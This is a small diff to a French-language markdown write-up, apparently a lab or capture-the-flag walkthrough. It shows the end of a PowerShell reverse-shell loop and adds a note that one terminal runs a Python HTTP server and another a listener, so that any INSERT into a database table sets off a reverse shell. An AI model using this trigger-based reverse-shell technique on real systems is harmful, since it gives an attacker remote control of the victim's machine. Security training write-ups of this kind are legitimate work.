@@ -332,4 +332,6 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $client.Close()
 ```
 
-Il faut donc ouvrir 2 terminaux, un avec un serveur `python3 -m http.server` et un listener
+Il faut donc ouvrir 2 terminaux, un avec un serveur `python3 -m http.server` et un listener.
+<br>
+Dès qu'il y aura un INSERT dans la table, cela déclenchera un reverse shell.
